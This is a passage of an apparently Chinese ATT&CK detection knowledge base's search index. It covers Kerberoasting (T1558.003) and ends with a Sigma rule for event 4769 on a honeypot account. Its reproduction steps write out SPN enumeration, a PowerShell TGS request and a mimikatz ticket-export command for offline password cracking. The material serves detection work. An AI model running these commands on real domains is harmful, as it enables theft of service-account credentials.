81%E8%BD%AC%E5%82%A8/#_8","text":"MITRE-ATT&CK-T1552-006 https://attack.mitre.org/techniques/T1552/006/ [\u7ffb\u8bd1 + \u5b9e\u8df5] \u51e0\u79cd\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u65b9\u5f0f https://attacker.cc/index.php/archives/10/ \u57df\u5b89\u5168\u7bc7:\u5bfb\u627eSYSVOL\u91cc\u7684\u5bc6\u7801\u548c\u653b\u51fbGPP\uff08\u7ec4\u7b56\u7565\u504f\u597d\uff09 https://www.freebuf.com/vuls/92016.html \u5229\u7528\u57df\u51ed\u636e:\u89e3\u5bc6GPP\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801 https://www.cnblogs.com/index-htm/p/5412496.html \u5728SYSVOL\u4e2d\u67e5\u627e\u5bc6\u7801\u5e76\u5229\u7528\u7ec4\u7b56\u7565\u9996\u9009\u9879 https://adsecurity.org/?p=2288","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1558-003-windows-\u57fa\u4e8eSPN\u51ed\u8bc1\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u6216\u55c5\u63a2\u7f51\u7edc\u6d41\u91cf\u4ee5\u83b7\u5f97\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u86ee\u529b\u653b\u51fb\u7684\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u7968\u8bc1\u3002 \u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u4e3a\u4e86\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u8d1f\u8d23\u8fd0\u884c\u670d\u52a1[3]\u7684\u5e10\u6237\uff09\u76f8\u5173\u8054\u3002 \u62e5\u6709\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u76f8\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS\u200b\u200b-REP etype 23\u54c8\u5e0c\u5c06\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u86ee\u529b\u653b\u51fb\u53ef\u80fd\u66b4\u9732\u660e\u6587\u51ed\u636e\u7684\u653b\u51fb\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u6355\u83b7\u7684\u670d\u52a1\u7968\u8bc1\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002 \u6563\u5217\u7684\u7834\u89e3\u53ef\u80fd\u4f1a\u901a\u8fc7\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u6765\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\u3002 SPN(Service Principal Name)\u670d\u52a1\u4e3b\u4f53\u540d \u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u8981\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u8d1f\u8d23\u8fd0\u884c\u670d\u52a1\u7684\u5e10\u6237\uff09\u76f8\u5173\u8054\u3002 \u62e5\u6709\u6709\u6548Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u53ef\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS-REP etype 23\u54c8\u5e0c\u88ab\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u660e\u6587\u51ed\u636e\u6cc4\u9732\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u6355\u83b7\u7684\u670d\u52a1\u7968\u636e\u6765\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bSpnEndpointIdentity\u548cUpnEndpointIdentity\u3002\u8fd9\u4e24\u4e2aEndpointIdentity\u662fWindows\u8ba4\u8bc1\u4e0b\u670d\u52a1\u8eab\u4efd\u7684\u4e24\u79cd\u8868\u73b0\u5f62\u5f0f\u3002\u524d\u8005\u88ab\u79f0\u4e3a\u670d\u52a1\u4e3b\u4f53\u540d\uff08SPN\uff1aService Principal Name\uff0c\u4ee5\u4e0b\u7b80\u79f0SPN\uff09\uff0c\u53e6\u4e00\u79cd\u88ab\u79f0\u4e3a\u7528\u6237\u4e3b\u4f53\u540d\uff08UPN\uff1aUser Principal Name\uff0c\u4ee5\u4e0b\u7b80\u79f0UPN\uff09\u3002 \u5982\u679c\u4f60\u5bf9Kerberos\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\uff0c\u76f8\u4fe1\u4e00\u5b9a\u5bf9SPN\u4e0d\u4f1a\u611f\u5230\u964c\u751f\u3002\u5bf9\u4e8e\u4e00\u4e2a\u8fd0\u884c\u5728\u57df\u73af\u5883\u4e2d\u67d0\u53f0\u673a\u5668\u4e0a\u7684\u670d\u52a1\uff0c\u5b83\u80fd\u88ab\u8bbf\u95ee\u5b83\u7684\u5ba2\u6237\u7aef\u8ba4\u8bc1\u7684\u5148\u51b3\u6761\u4ef6\u662f\uff1a\u5ba2\u6237\u7aef\u80fd\u591f\u552f\u4e00\u6807\u8bc6\u8be5\u670d\u52a1\uff0c\u800cSPN\u5c31\u53ef\u4ee5\u770b\u4f5c\u662f\u8fd9\u4e2a\u6807\u8bc6\u7b26\u3002\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u5728\u673a\u5668\u5e10\u53f7\uff08\u6216\u8005\u7cfb\u7edf\u5e10\u53f7\uff0c\u6bd4\u5982LocalService, LocalSystem, or NetworkService\u7b49\uff09\u4e0b\uff0c\u670d\u52a1\u8eab\u4efd\u901a\u8fc7SPN\u8868\u793a\uff1b\u5982\u679c\u6267\u884c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u7684\u662f\u4e00\u4e2a\u57df\u7528\u6237\u5e10\u6237\uff0c\u5219\u91c7\u7528UPN\u8868\u793a\u670d\u52a1\u8eab\u4efd\u3002WCF\u4e2d\u7684SPN\u548cUPN\u7684\u683c\u5f0f\u5982\u4e0b\u3002\u5982\u679c\u5ba2\u6237\u7aef\u9884\u5148\u6307\u5b9aSPN/UPN\u8868\u793a\u670d\u52a1\u8eab\u4efd\uff0c\u5b83\u901a\u8fc7\u6267\u884c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u5e10\u53f7\u5bf9\u5e94\u7684Windows\u51ed\u8bc1\u548cSPN/UPN\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u672a\u786e\u5b9a\u670d\u52a1\u8fd0\u884c\u5728\u9884\u5148\u8bbe\u5b9a\u7684\u673a\u5668\u6216\u8005\u67d0\u4e2a\u57df\u7528\u6237\u5e10\u53f7\u4e0b\u3002 \u8be6\u7ec6\u4ecb\u7ecd\u4f60\u53ef\u4ee5\u53c2\u8003WCF\u5b89\u5168\u7cfb\u5217\uff1a https://www.cnblogs.com/artech/archive/2011/06/12/Authentication_043.html \u6d4b\u8bd5\u6848\u4f8b SPN\u653b\u51fb\u539f\u7406 Active Directory\u73af\u5883\u4e2d\u53d1\u73b0\u670d\u52a1\u7684\u6700\u4f73\u65b9\u5f0f\u662f\u901a\u8fc7 SPN\u626b\u63cf \u653b\u51fb\u8005\u901a\u8fc7SPN\u626b\u63cf\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u7f51\u7edc\u4e0a\u7684\u6bcf\u4e2aIP\u4ee5\u68c0\u67e5\u670d\u52a1\u7aef\u53e3\u3002SPN\u626b\u63cf\u901a\u8fc7LDAP\u67e5\u8be2\u57df\u63a7\u5236\u5668\u4ee5\u4fbf\u53d1\u73b0\u670d\u52a1\u3002\u7531\u4e8eSPN\u67e5\u8be2\u662f\u6b63\u5e38Kerberos\u7968\u8bc1\u6267\u884c\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u5f88\u96be\u88ab\u5b89\u5168\u8bbe\u5907\u63a2\u6d4b\u5230\uff0c\u800cnetwork\u7aef\u53e3\u626b\u63cf\u662f\u76f8\u5f53\u660e\u663e\u7684\uff0c\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 \u5373\u4f7f\u60a8\u4e0d\u5b8c\u5168\u4e86\u89e3Kerberos\u7684\u5185\u90e8\u5de5\u4f5c\u539f\u7406\uff0c\u653b\u51fb\u8fc7\u7a0b\u4e5f\u53ef\u5f52\u7eb3\u4e3a\uff1a \u626b\u63cfActive Directory\u4ee5\u8bbe\u7f6eSPN\u503c\u7684\u7528\u6237\u5e10\u6237\u3002 \u4f7f\u7528SPN\u503c\u4eceAD\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1 \u5c06\u670d\u52a1\u7968\u636e\u63d0\u53d6\u5230\u5185\u5b58\u5e76\u4fdd\u5b58\u5230\u6587\u4ef6 \u66b4\u529b\u7834\u89e3\u653b\u51fb\u8fd9\u4e9b\u5bc6\u7801\u76f4\u5230\u7834\u89e3 \u4e3e\u4e2a\u4f8b\u5b50\uff1a \u5229\u7528SPN\u626b\u63cf\u63a2\u6d4b\u542b\u6709SQL\u670d\u52a1\u7684\u4e3b\u673a\u670d\u52a1\uff1b \u8bc6\u522b\u76ee\u6807\u540e\uff0c\u5229\u7528piwehsell\u811a\u672c\u8bf7\u6c42\u6b64\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7684\u670d\u52a1\u7968\u636e\uff1b\u8bf7\u6ce8\u610f\uff0c\u8bf7\u6c42\u7684\u670d\u52a1\u7968\u8bc1\u662f\u5177\u6709RC4\u52a0\u5bc6\u7c7b\u578b \u4e00\u65e6\u5ba2\u6237\u7aef\u63a5\u6536\u5230\u7968\u636e\u4ee5\u540e\uff0c\u53ef\u4ee5\u5229\u7528mimikatz\u6216\u5176\u4ed6\u5de5\u5177\u5728\u7528\u6237\u7684\u5185\u5b58\u4e2d\u5bfc\u51fa\u6240\u6709kerberos\u7968\u8bc1\uff1b\uff08\u4e0d\u6d89\u53ca\u6743\u9650\u63d0\u5347\uff09 \u6700\u540e\uff0c\u5c06\u7968\u636e\u5bfc\u51fa\u540e\uff0c\u5c06\u7968\u636e\u6587\u4ef6\u62f7\u8d1d\u5230\u6b63\u5728\u8fd0\u884ckerberoast\u7684kali linux\u4e3b\u673a\uff08\u6216\u5176\u4ed6\u4e3b\u673a\uff09\u3002\u5229\u7528wordlist\u5bc6\u7801\u5b57\u5178\uff0c\u53ef\u4ee5\u8fdb\u884c\u7834\u89e3\u4e0e\u7968\u636e\u76f8\u5173\u7684\u670d\u52a1\u8d26\u6237\u5bc6\u7801\u3002 \u6ce8\u610f\uff1a\u83b7\u5f97\u670d\u52a1\u7968\u636e\u4e0d\u9700\u8981\u63d0\u9ad8\u6743\u9650\uff0c\u4e5f\u4e0d\u4f1a\u5411\u76ee\u6807\u53d1\u9001\u4efb\u4f55\u6d41\u91cf\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 Netflow\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u73af\u5883\u51c6\u5907 windows server 2012\u57df\u63a7 \u9700\u5b89\u88c5powershell AD\u6a21\u5757 windows server 2016\u88ab\u63a7\u4e3b\u673a \u9700\u5b89\u88c5powershell AD\u6a21\u5757 \u5177\u4f53\u53ef\u53c2\u8003\uff1a https://zhuanlan.zhihu.com/p/25942591 \u6d4b\u8bd5\u8fc7\u7a0b 1.\u5b89\u88c5powershell AD\u6a21\u5757 PS >Import-Module ServerManager ; Add-WindowsFeature RSAT-AD-PowerShell 2.\u67e5\u8be2\u5f53\u524d\u57df\u5185SPN\u670d\u52a1 setspn.exe -q */* 3.\u8bf7\u6c42\u6307\u5b9a\u7684TGS $SPNName = 'MSSQLSvc/DC1.test.com' Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName 4.\u6267\u884c\u540e\u8f93\u5165klist\u67e5\u770b\u5185\u5b58\u4e2d\u7684\u7968\u636e\uff0c\u53ef\u627e\u5230\u83b7\u5f97\u7684TGS. 5.\u4f7f\u7528mimikatz kerberos::list /export \u6d4b\u8bd5\u7559\u75d5 windows \u5b89\u5168\u65e5\u5fd74769 Netflow \u52a0\u5bc6\u65b9\u5f0f\u3001\u670d\u52a1\u540d\u79f0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: SPN\u670d\u52a1\u626b\u63cf\u871c\u7f50\u8d26\u6237 description: 0day.org\u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c references: https://adsecurity.org/?p=3458 tags: T1558-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4769 #\u5df2\u8bf7\u6c42 Kerberos \u670d\u52a1\u7968\u8bc1\u3002 ServiceName: abcc #\u670d\u52a1\u4fe1\u606f>\u670d\u52a1\u540d\u79f0\uff08\u871c\u7f50\u8d26\u6237\u7528\u6237\uff09 Clientaddress: ::ffff:* #\u7f51\u7edc\u4fe1\u606f>\u5ba2\u6237\u7aef\u5730\u5740 Ticketoptions: 0x40810000 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u4fe1\u606f Ticketencryptiontype: 0x17 #\u9644\u52a0\u4fe1\u606f>\u7968\u8bc1\u52a0\u5bc6\u7c7b\u578b condition: selection level: medium \u5efa\u8bae \u6ce8\u610f\uff1a\u6b64\u89c4\u5219\u65e0\u6cd5\u76f4\u63a5\u5229\u7528\uff0c\u4ec5\u63d0\u4f9b\u68c0\u6d4b\u601d\u8def\u3002\u9700\u8981\u57df\u5185\u5185\u7f6e\u871c\u7f50\u8d26\u6237\u7528\u6237\uff0c\u5f53\u653b\u51fb\u8005\u5bf9\u871c\u7f50\u8d26\u6237\u53d1\u8d77\u626b\u63cf\u3001\u8bf7\u6c42TGS\u65f6\uff0c\u6b64\u89c4\u5219\u53ef\u88ab\u89e6\u53d1\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1558-003 https://attack.mitre.org/techniques/T1558/003 SPN\u626b\u63cfSQL\u670d\u52a1\u4e3b\u4f53\u811a\u672c https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers powershell\u63a2\u6d4b\u811a\u672c https://github.com/PyroTek3/PowerShell-AD-Recon Active Directory\u4e2d\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u653b\u51fb\u65b9\u6cd5 https://www.cnblogs.com/backlion/p/7159296.html \u4f7f\u7528KERBEROASTING\u63d0\u53d6\u670d\u52a1\u5e10\u6237\u5bc6\u7801 https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/ Active Directory\u4e2d\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\u7684\u8bf4\u660e https://thebackroomtech.com/2018/08/21/explanation-of-service-principal-names-in-active-directory/ \u68c0\u6d4bKerberoasting\u6d3b\u52a8 https://adsecurity.org/?p=3458 \u68c0\u6d4bKerberoasting\u6d3b\u52a8\u7b2c2\u90e8\u5206 https://adsecurity.org/?p=3513 Active Directory PowerShell\u6a21\u5757\u6536\u96c6AD\u4fe1\u606f https://www.cnblogs.com/backlion/p/9267100.html","title":"T1558-003-windows-\u57fa\u4e8eSPN\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1558-003-windows-spn","text":"","title":"T1558-003-windows-\u57fa\u4e8eSPN\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u6216\u55c5\u63a2\u7f51\u7edc\u6d41\u91cf\u4ee5\u83b7\u5f97\u53ef\u80fd\u5bb9\u6613\u53d7\u5230\u86ee\u529b\u653b\u51fb\u7684\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u7968\u8bc1\u3002 \u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u4e3a\u4e86\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u8d1f\u8d23\u8fd0\u884c\u670d\u52a1[3]\u7684\u5e10\u6237\uff09\u76f8\u5173\u8054\u3002 \u62e5\u6709\u6709\u6548\u7684Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u5bf9\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u8fdb\u884c\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u76f8\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS\u200b\u200b-REP etype 23\u54c8\u5e0c\u5c06\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u86ee\u529b\u653b\u51fb\u53ef\u80fd\u66b4\u9732\u660e\u6587\u51ed\u636e\u7684\u653b\u51fb\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u4e2d\u6355\u83b7\u7684\u670d\u52a1\u7968\u8bc1\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002 \u6563\u5217\u7684\u7834\u89e3\u53ef\u80fd\u4f1a\u901a\u8fc7\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u6765\u5b9e\u73b0\u6301\u4e45\u6027\uff0c\u7279\u6743\u5347\u7ea7\u548c\u6a2a\u5411\u79fb\u52a8\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#spnservice-principal-name","text":"\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\uff08SPN\uff09\u7528\u4e8e\u552f\u4e00\u6807\u8bc6Windows\u670d\u52a1\u7684\u6bcf\u4e2a\u5b9e\u4f8b\u3002\u8981\u542f\u7528\u8eab\u4efd\u9a8c\u8bc1\uff0cKerberos\u8981\u6c42SPN\u4e0e\u81f3\u5c11\u4e00\u4e2a\u670d\u52a1\u767b\u5f55\u5e10\u6237\uff08\u4e13\u95e8\u8d1f\u8d23\u8fd0\u884c\u670d\u52a1\u7684\u5e10\u6237\uff09\u76f8\u5173\u8054\u3002 \u62e5\u6709\u6709\u6548Kerberos\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u57df\u63a7\u5236\u5668\uff08DC\uff09\u8bf7\u6c42\u4efb\u4f55SPN\u7684\u4e00\u4e2a\u6216\u591a\u4e2aKerberos\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u670d\u52a1\u7968\u8bc1\u3002\u8fd9\u4e9b\u7968\u8bc1\u7684\u4e00\u90e8\u5206\u53ef\u4ee5\u4f7f\u7528RC4\u7b97\u6cd5\u52a0\u5bc6\uff0c\u8fd9\u610f\u5473\u7740\u4e0eSPN\u5173\u8054\u7684\u670d\u52a1\u5e10\u6237\u7684Kerberos 5 TGS-REP etype 23\u54c8\u5e0c\u88ab\u7528\u4f5c\u79c1\u94a5\uff0c\u56e0\u6b64\u5bb9\u6613\u53d7\u5230\u79bb\u7ebf\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u660e\u6587\u51ed\u636e\u6cc4\u9732\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ece\u7f51\u7edc\u6d41\u91cf\u6355\u83b7\u7684\u670d\u52a1\u7968\u636e\u6765\u6267\u884c\u76f8\u540c\u7684\u653b\u51fb\u3002 \u5148\u6765\u4ecb\u7ecd\u4e00\u4e0bSpnEndpointIdentity\u548cUpnEndpointIdentity\u3002\u8fd9\u4e24\u4e2aEndpointIdentity\u662fWindows\u8ba4\u8bc1\u4e0b\u670d\u52a1\u8eab\u4efd\u7684\u4e24\u79cd\u8868\u73b0\u5f62\u5f0f\u3002\u524d\u8005\u88ab\u79f0\u4e3a\u670d\u52a1\u4e3b\u4f53\u540d\uff08SPN\uff1aService Principal Name\uff0c\u4ee5\u4e0b\u7b80\u79f0SPN\uff09\uff0c\u53e6\u4e00\u79cd\u88ab\u79f0\u4e3a\u7528\u6237\u4e3b\u4f53\u540d\uff08UPN\uff1aUser Principal Name\uff0c\u4ee5\u4e0b\u7b80\u79f0UPN\uff09\u3002 \u5982\u679c\u4f60\u5bf9Kerberos\u6709\u4e00\u5b9a\u7684\u4e86\u89e3\uff0c\u76f8\u4fe1\u4e00\u5b9a\u5bf9SPN\u4e0d\u4f1a\u611f\u5230\u964c\u751f\u3002\u5bf9\u4e8e\u4e00\u4e2a\u8fd0\u884c\u5728\u57df\u73af\u5883\u4e2d\u67d0\u53f0\u673a\u5668\u4e0a\u7684\u670d\u52a1\uff0c\u5b83\u80fd\u88ab\u8bbf\u95ee\u5b83\u7684\u5ba2\u6237\u7aef\u8ba4\u8bc1\u7684\u5148\u51b3\u6761\u4ef6\u662f\uff1a\u5ba2\u6237\u7aef\u80fd\u591f\u552f\u4e00\u6807\u8bc6\u8be5\u670d\u52a1\uff0c\u800cSPN\u5c31\u53ef\u4ee5\u770b\u4f5c\u662f\u8fd9\u4e2a\u6807\u8bc6\u7b26\u3002\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u679c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u5728\u673a\u5668\u5e10\u53f7\uff08\u6216\u8005\u7cfb\u7edf\u5e10\u53f7\uff0c\u6bd4\u5982LocalService, LocalSystem, or NetworkService\u7b49\uff09\u4e0b\uff0c\u670d\u52a1\u8eab\u4efd\u901a\u8fc7SPN\u8868\u793a\uff1b\u5982\u679c\u6267\u884c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u7684\u662f\u4e00\u4e2a\u57df\u7528\u6237\u5e10\u6237\uff0c\u5219\u91c7\u7528UPN\u8868\u793a\u670d\u52a1\u8eab\u4efd\u3002WCF\u4e2d\u7684SPN\u548cUPN\u7684\u683c\u5f0f\u5982\u4e0b\u3002\u5982\u679c\u5ba2\u6237\u7aef\u9884\u5148\u6307\u5b9aSPN/UPN\u8868\u793a\u670d\u52a1\u8eab\u4efd\uff0c\u5b83\u901a\u8fc7\u6267\u884c\u670d\u52a1\u5bc4\u5bbf\u8fdb\u7a0b\u5e10\u53f7\u5bf9\u5e94\u7684Windows\u51ed\u8bc1\u548cSPN/UPN\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u672a\u786e\u5b9a\u670d\u52a1\u8fd0\u884c\u5728\u9884\u5148\u8bbe\u5b9a\u7684\u673a\u5668\u6216\u8005\u67d0\u4e2a\u57df\u7528\u6237\u5e10\u53f7\u4e0b\u3002 \u8be6\u7ec6\u4ecb\u7ecd\u4f60\u53ef\u4ee5\u53c2\u8003WCF\u5b89\u5168\u7cfb\u5217\uff1a https://www.cnblogs.com/artech/archive/2011/06/12/Authentication_043.html","title":"SPN(Service Principal Name)\u670d\u52a1\u4e3b\u4f53\u540d"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1558-003-win-SPN-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#spn","text":"Active Directory\u73af\u5883\u4e2d\u53d1\u73b0\u670d\u52a1\u7684\u6700\u4f73\u65b9\u5f0f\u662f\u901a\u8fc7 SPN\u626b\u63cf \u653b\u51fb\u8005\u901a\u8fc7SPN\u626b\u63cf\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u4e0d\u9700\u8981\u8fde\u63a5\u5230\u7f51\u7edc\u4e0a\u7684\u6bcf\u4e2aIP\u4ee5\u68c0\u67e5\u670d\u52a1\u7aef\u53e3\u3002SPN\u626b\u63cf\u901a\u8fc7LDAP\u67e5\u8be2\u57df\u63a7\u5236\u5668\u4ee5\u4fbf\u53d1\u73b0\u670d\u52a1\u3002\u7531\u4e8eSPN\u67e5\u8be2\u662f\u6b63\u5e38Kerberos\u7968\u8bc1\u6267\u884c\u7684\u4e00\u90e8\u5206\uff0c\u6240\u4ee5\u5f88\u96be\u88ab\u5b89\u5168\u8bbe\u5907\u63a2\u6d4b\u5230\uff0c\u800cnetwork\u7aef\u53e3\u626b\u63cf\u662f\u76f8\u5f53\u660e\u663e\u7684\uff0c\u5bb9\u6613\u88ab\u53d1\u73b0\u3002 \u5373\u4f7f\u60a8\u4e0d\u5b8c\u5168\u4e86\u89e3Kerberos\u7684\u5185\u90e8\u5de5\u4f5c\u539f\u7406\uff0c\u653b\u51fb\u8fc7\u7a0b\u4e5f\u53ef\u5f52\u7eb3\u4e3a\uff1a \u626b\u63cfActive Directory\u4ee5\u8bbe\u7f6eSPN\u503c\u7684\u7528\u6237\u5e10\u6237\u3002 \u4f7f\u7528SPN\u503c\u4eceAD\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1 \u5c06\u670d\u52a1\u7968\u636e\u63d0\u53d6\u5230\u5185\u5b58\u5e76\u4fdd\u5b58\u5230\u6587\u4ef6 \u66b4\u529b\u7834\u89e3\u653b\u51fb\u8fd9\u4e9b\u5bc6\u7801\u76f4\u5230\u7834\u89e3 \u4e3e\u4e2a\u4f8b\u5b50\uff1a \u5229\u7528SPN\u626b\u63cf\u63a2\u6d4b\u542b\u6709SQL\u670d\u52a1\u7684\u4e3b\u673a\u670d\u52a1\uff1b 